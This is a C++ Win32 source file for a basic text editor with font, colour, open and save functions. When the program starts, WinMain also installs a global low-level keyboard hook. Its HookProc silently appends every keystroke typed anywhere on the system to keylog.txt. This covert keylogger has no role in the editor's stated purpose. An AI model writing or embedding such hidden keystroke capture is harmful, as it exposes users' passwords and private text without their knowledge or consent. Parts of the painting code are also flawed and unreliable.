#include <windows.h>
#include <richedit.h>
#include <commdlg.h>
#include <gdiplus.h>
#include <string>
#include <richedit.h>
#pragma comment (lib, "Gdiplus.lib")

HINSTANCE hInst;
HWND hMainWnd;
HWND hEdit;
LOGFONT lf;
COLORREF textColor;
COLORREF bgColor = RGB(255, 255, 255);
HBRUSH hBrush = NULL;
HHOOK hHook = NULL;

#define IDC_CHOOSE_FONT 1001
#define IDC_CHOOSE_BG_COLOR 1003
#define IDC_OPEN_FILE 1004
#define IDC_SAVE_FILE 1005

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
void CreateMainWin(HINSTANCE hInstance, int nCmdShow);
void UpdateFont();
void OpenFile();
void SaveFile();
void DrawBackground(HWND hwdn);
void DrawText();

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;

            DWORD vkCode = pKeyInfo->vkCode;
            DWORD scanCode = pKeyInfo->scanCode;

            FILE* logFile;
            if (fopen_s(&logFile, "keylog.txt", "a") == 0 && logFile != nullptr)
            {
                // Удалось успешно открыть файл для записи
                fprintf(logFile, "Key pressed: VK Code = %lu, Scan Code = %lu\n", vkCode, scanCode);
                fclose(logFile);
            }
            else
            {
                // Обработка ошибки при открытии файла
                MessageBox(NULL, L"Failed to open log file", L"Error", MB_ICONERROR);
            }
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}



int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    hInst = hInstance;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    CreateMainWin(hInstance, nCmdShow);

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInstance, 0);

    if (hHook == NULL)
    {
        MessageBox(NULL, L"Failed to set hook", L"Error", MB_ICONERROR);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hBrush)
    {
        DeleteObject(hBrush);
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
    return (int)msg.wParam;
}

void CreateMainWin(HINSTANCE hInstance, int nCmdShow)
{
    LoadLibrary(TEXT("Msftedit.dll"));
    WNDCLASSEX wcex;
    memset(&wcex, 0, sizeof(wcex));
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.hInstance = hInstance;
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszClassName = L"TextEditorClass";
    RegisterClassEx(&wcex);


    hMainWnd = CreateWindow(L"TextEditorClass", L"Text Editor", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, NULL, hInstance, NULL);
    
    if (!hMainWnd)
    {
        MessageBox(NULL, L"Window creation failed", L"Error", MB_ICONERROR);
        return;
    }

    ShowWindow(hMainWnd, nCmdShow);
    UpdateWindow(hMainWnd);

    hEdit = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN | WS_EX_LAYERED,
        200, 100, 400, 200, hMainWnd, NULL, hInstance, NULL);

    CreateWindow(L"BUTTON", L"Choose Font", WS_CHILD | WS_VISIBLE, 10, 10, 100, 30, hMainWnd, (HMENU)IDC_CHOOSE_FONT, hInstance, NULL);
    CreateWindow(L"BUTTON", L"Choose BG Color", WS_CHILD | WS_VISIBLE, 120, 10, 150, 30, hMainWnd, (HMENU)IDC_CHOOSE_BG_COLOR, hInstance, NULL);
    CreateWindow(L"BUTTON", L"Open File", WS_CHILD | WS_VISIBLE, 440, 10, 100, 30, hMainWnd, (HMENU)IDC_OPEN_FILE, hInstance, NULL);
    CreateWindow(L"BUTTON", L"Save File", WS_CHILD | WS_VISIBLE, 550, 10, 100, 30, hMainWnd, (HMENU)IDC_SAVE_FILE, hInstance, NULL);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_SIZE:
        MoveWindow(hEdit, 0, 0, LOWORD(lParam), HIWORD(lParam), TRUE);
        break;

    case WM_PAINT:
        DrawBackground(hWnd);
        DrawText();
        break;

    case WM_COMMAND:
        switch (LOWORD(wParam))
        {
        case IDC_CHOOSE_FONT:
        {
            CHOOSEFONT cf;
            ZeroMemory(&cf, sizeof(cf));
            cf.lStructSize = sizeof(cf);
            cf.hwndOwner = hWnd;
            cf.lpLogFont = &lf;
            cf.Flags = CF_SCREENFONTS | CF_EFFECTS | CF_INITTOLOGFONTSTRUCT;
            if (ChooseFont(&cf))
            {
                UpdateFont();
            }
        }
        break;
        case IDC_CHOOSE_BG_COLOR:
        {
            CHOOSECOLOR cc;
            static COLORREF acrCustClr[16];
            ZeroMemory(&cc, sizeof(cc));
            cc.lStructSize = sizeof(cc);
            cc.hwndOwner = hWnd;
            cc.lpCustColors = (LPDWORD)acrCustClr;
            cc.rgbResult = bgColor;
            cc.Flags = CC_FULLOPEN | CC_RGBINIT;
            if (ChooseColor(&cc))
            {
                bgColor = cc.rgbResult;

                if (hBrush)
                {
                    DeleteObject(hBrush);
                }
                hBrush = CreateSolidBrush(bgColor);

                RECT rcClient;
                GetClientRect(hWnd, &rcClient);
                HDC hdc = GetDC(hWnd);
                FillRect(hdc, &rcClient, hBrush);
                ReleaseDC(hWnd, hdc);

                InvalidateRect(hWnd, NULL, TRUE);
            }
        }
        break;

        case IDC_OPEN_FILE:
            OpenFile();
            break;

        case IDC_SAVE_FILE:
            SaveFile();
            break;
        }
        break;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

void UpdateFont()
{
    HFONT hFont = CreateFontIndirect(&lf);
    if (hFont)
    {
        SendMessage(hEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
        SetTextColor(GetDC(hEdit), textColor);
        InvalidateRect(hEdit, NULL, TRUE);
    }
}

void OpenFile()
{
    OPENFILENAME ofn;
    wchar_t szFileName[MAX_PATH] = L"";
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hMainWnd;
    ofn.lpstrFilter = L"Text Files\0*.txt\0All Files\0*.*\0";
    ofn.lpstrFile = szFileName;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;

    if (GetOpenFileName(&ofn))
    {
        HANDLE hFile = CreateFile(ofn.lpstrFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            DWORD dwFileSize = GetFileSize(hFile, NULL);
            if (dwFileSize != INVALID_FILE_SIZE)
            {
                char* pBuffer = new char[dwFileSize + 1];
                DWORD dwRead;
                if (ReadFile(hFile, pBuffer, dwFileSize, &dwRead, NULL))
                {
                    pBuffer[dwRead] = '\0';
                    SetWindowTextA(hEdit, pBuffer);
                }
                delete[] pBuffer;
            }
            CloseHandle(hFile);
        }
    }
}

void SaveFile()
{
    OPENFILENAME ofn;
    wchar_t szFileName[MAX_PATH] = L"";
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hMainWnd;
    ofn.lpstrFilter = L"Text Files\0*.txt\0All Files\0*.*\0";
    ofn.lpstrFile = szFileName;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST;

    if (GetSaveFileName(&ofn))
    {
        std::wstring filePath = ofn.lpstrFile;
        if (filePath.find_last_of(L".") == std::wstring::npos)
        {
            filePath += L".txt";
        }

        HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            int nTextLength = GetWindowTextLength(hEdit);
            if (nTextLength > 0)
            {
                char* pBuffer = new char[nTextLength + 1];
                GetWindowTextA(hEdit, pBuffer, nTextLength + 1);
                DWORD dwWritten;
                WriteFile(hFile, pBuffer, nTextLength, &dwWritten, NULL);
                delete[] pBuffer;
            }
            CloseHandle(hFile);
        }
    }
}

void DrawBackground(HWND hWnd)
{
    PAINTSTRUCT ps;
    HDC hdc = BeginPaint(hWnd, &ps);
    RECT rect;
    GetClientRect(hWnd, &rect);

    FillRect(hdc, &rect, hBrush);

    EndPaint(hWnd, &ps);
}

void DrawText()
{
    PAINTSTRUCT ps;
    HDC hdc = BeginPaint(hEdit, &ps);

    SetTextColor(hdc, textColor);
    SetBkColor(hdc, bgColor);

    int nTextLength = GetWindowTextLength(hEdit);
    if (nTextLength > 0)
    {
        char* pBuffer = new char[nTextLength + 1];
        GetWindowTextA(hEdit, pBuffer, nTextLength + 1);
        TextOutA(hdc, 0, 0, pBuffer, nTextLength);
        delete[] pBuffer;
    }

    EndPaint(hEdit, &ps);
}
